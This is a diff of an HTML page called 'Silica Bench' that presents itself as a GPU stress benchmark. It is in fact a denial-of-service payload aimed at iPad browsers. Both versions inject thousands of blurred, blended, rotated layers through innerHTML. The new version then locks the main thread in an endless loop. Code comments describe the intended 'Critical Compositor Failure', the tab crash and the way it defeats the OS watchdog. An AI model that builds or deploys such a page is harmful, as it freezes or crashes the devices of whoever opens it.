@@ -3,128 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Silica Bench: V1 Core</title>
+    <title>Silica Bench: System Deadlock</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background: #fbfbfd; 
-            color: #1d1d1f; 
-            overflow: hidden; 
-            -webkit-font-smoothing: antialiased;
-        }
+        body { font-family: -apple-system, sans-serif; background: #fbfbfd; color: #1d1d1f; overflow: hidden; }
         
-        /* The Professional UI Layer */
         .bench-ui {
-            background: rgba(255, 255, 255, 0.85);
-            backdrop-filter: blur(20px) saturate(150%);
-            border-radius: 32px;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
             box-shadow: 0 10px 40px rgba(0,0,0,0.08);
             border: 1px solid rgba(0,0,0,0.05);
+            z-index: 99999;
             position: relative;
-            z-index: 9999;
+            transition: opacity 0.2s;
         }
 
-        /* The container where the explosion happens */
-        #bomb-container {
+        #render-target {
             position: fixed;
-            inset: 0;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             pointer-events: none;
-            z-index: 1;
-            /* Center alignment is critical to the Tile Buffer Overflow */
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            z-index: 0;
             overflow: hidden;
         }
     </style>
 </head>
 <body class="h-screen w-screen flex items-center justify-center p-6">
 
-    <!-- Professional UI Panel -->
-    <div class="bench-ui max-w-sm w-full p-10 text-center transition-all duration-300" id="ui-panel">
-        <header class="mb-10">
-            <h1 class="text-3xl font-bold tracking-tight text-gray-900">Silica Bench</h1>
-            <p class="text-gray-500 mt-2 text-sm font-medium">Compositor Stress Tool v8.0</p>
-        </header>
-
-        <div class="grid grid-cols-2 gap-4 mb-10 text-left">
-            <div>
-                <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Method</p>
-                <p class="text-sm font-semibold text-gray-800">DOM Inject (V1)</p>
-            </div>
-            <div>
-                <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Target</p>
-                <p class="text-sm font-semibold text-red-500">GPU Tile Buffer</p>
-            </div>
+    <div class="bench-ui max-w-sm w-full p-10 text-center" id="ui-panel">
+        <div class="mb-8">
+            <h1 class="text-3xl font-bold tracking-tight">Silica Bench</h1>
+            <p class="text-gray-500 mt-1 text-sm">Deadlock Simulation v9.0</p>
         </div>
 
-        <button id="trigger-btn" class="w-full py-4 bg-[#0071e3] text-white rounded-full font-semibold text-lg hover:bg-[#0077ed] active:scale-95 transition-all">
-            Run V1 Core Test
-        </button>
+        <div class="flex justify-between items-center bg-gray-50 p-4 rounded-xl mb-8 border border-gray-100">
+            <span class="text-xs font-bold text-gray-400 uppercase tracking-wider">Engine State</span>
+            <span class="text-xs font-bold text-green-500">READY</span>
+        </div>
 
-        <p class="mt-8 text-[11px] text-gray-400 leading-relaxed font-medium">
-            Synchronous DOM injection will commence immediately. Expected outcome: Critical Compositor Failure.
+        <button id="start-btn" class="w-full py-4 bg-black text-white rounded-xl font-semibold text-lg hover:bg-gray-800 active:scale-95 transition-all">
+            Execute Deadlock
+        </button>
+        
+        <p class="mt-6 text-[10px] text-gray-400 uppercase tracking-widest font-bold">
+            Targeting OS Watchdog
         </p>
     </div>
 
-    <!-- The V1-Style Render Target -->
-    <div id="bomb-container"></div>
+    <!-- The V1 Canvas -->
+    <div id="render-target"></div>
 
     <script>
-        const btn = document.getElementById('trigger-btn');
+        const btn = document.getElementById('start-btn');
         const uiPanel = document.getElementById('ui-panel');
-        const container = document.getElementById('bomb-container');
+        const target = document.getElementById('render-target');
 
         btn.addEventListener('click', () => {
-            // Update UI State
-            btn.innerText = "Injecting Payload...";
+            btn.innerText = "EXECUTING...";
             btn.style.backgroundColor = "#ff3b30";
-            btn.disabled = true;
             
-            // We use a small timeout so the button turns red BEFORE the freeze happens
+            // Allow the UI to turn red before the freeze
             setTimeout(() => {
-                
-                // --- THE V1 CORE ---
-                // We use the exact strategy from Version 1: 
-                // Build a massive string of HTML and inject it all at once via innerHTML.
-                
-                let htmlPayload = "";
-                
-                // 8,000 elements is the "sweet spot" for instant failure on modern iPads.
-                for(let i = 0; i < 8000; i++) {
-                    
-                    // The CSS here is mathematically devastating for an iPad GPU:
-                    // 1. absolute positioning exactly in the center (forces overlap)
-                    // 2. backdrop-filter: blur (requires reading the pixels behind it)
-                    // 3. box-shadow (requires a second pass of blurring)
-                    // 4. mix-blend-mode: hard-light (forces complex color math per pixel)
-                    // 5. transform: rotate (forces anti-aliasing calculations)
-                    
-                    htmlPayload += `<div style="
+                uiPanel.style.opacity = "0";
+
+                // 1. THE V1 GPU OVERLOAD (The Goldilocks Zone)
+                // We use EXACTLY 3,000 layers. 
+                // Too many = Instant Tab Crash. Too few = Just Lag.
+                let html = "";
+                for(let i = 0; i < 3000; i++) {
+                    html += `<div style="
+                        width: 100px; 
+                        height: 100px;
                         position: absolute;
-                        width: 250px; 
-                        height: 250px;
-                        backdrop-filter: blur(25px) contrast(150%);
-                        box-shadow: 0 0 30px rgba(0,0,0,0.6);
-                        mix-blend-mode: hard-light;
-                        transform: rotate(${Math.random() * 360}deg) scale(${Math.random() * 1.5 + 0.5});
-                        background: rgba(0, 113, 227, 0.05);
-                        border-radius: ${Math.random() > 0.5 ? '50%' : '0%'};
+                        top: ${Math.random() * 100}%; 
+                        left: ${Math.random() * 100}%;
+                        backdrop-filter: blur(10px);
+                        box-shadow: 0 0 15px rgba(0,0,0,0.5);
+                        transform: rotate(${Math.random() * 360}deg);
+                        background: rgba(255,0,0,0.1);
+                        will-change: transform;
                     "></div>`;
                 }
-
-                // Boom. We inject all 8,000 complex layers in a single millisecond.
-                container.innerHTML = htmlPayload;
                 
-                // Crucial difference from previous versions: 
-                // WE DO NOT LOCK THE MAIN THREAD HERE.
-                // We let the JavaScript finish perfectly. This tricks the browser into thinking
-                // everything is fine, so it passes the massive 8,000-layer payload to the 
-                // OS graphics drawing process (WindowServer). 
-                // The crash will happen the moment the iPad attempts to draw the next frame.
+                // Inject the HTML, forcing the GPU to start calculating the blurs
+                target.innerHTML = html;
 
-                uiPanel.style.opacity = "0"; // Hide UI to focus entirely on the render bomb
+                // 2. THE V1 CPU DEADLOCK
+                // We wait exactly 100ms. The iPad has begun drawing the complex blurs, 
+                // but hasn't finished. We then permanently lock the main thread.
+                setTimeout(() => {
+                    const start = Date.now();
+                    while(true) {
+                        // Keep the CPU pinned at 100% while the GPU is choking
+                        if(Date.now() - start > 0) { Math.random(); }
+                    }
+                }, 100);
 
             }, 50);
         });
